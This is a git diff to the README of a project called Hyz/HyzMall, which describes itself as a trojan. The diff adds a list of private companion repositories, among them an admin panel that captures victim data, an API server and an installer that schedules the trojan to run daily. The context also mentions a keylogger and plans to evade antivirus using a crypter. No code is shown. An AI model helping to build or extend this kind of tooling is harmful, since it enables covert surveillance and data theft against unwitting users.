@@ -31,6 +31,16 @@ Hyz worked based in tasks, at server side (API) requested any task, the Hyz capt
 - zlib.dll
 - libcurl.dll
 
+## Important!
+
+**HyzMall have another repositories, but these repositories are private. If you want see these repositories, send me a email**
+
+Have:
+- HyzMallAdmin ( View for administrator, capture the data from HyzMallApi and create tasks )
+- HyzMallApi ( Server HTTP with routes and database )
+- HyzMallInstalator ( Instalator of HyzMall that create a task on windows to execute the trojan all the day)
+
+
 ##### Todo
 - Remove keylogger for prevent anti-virus.
 - Use AES-Cripter forked.
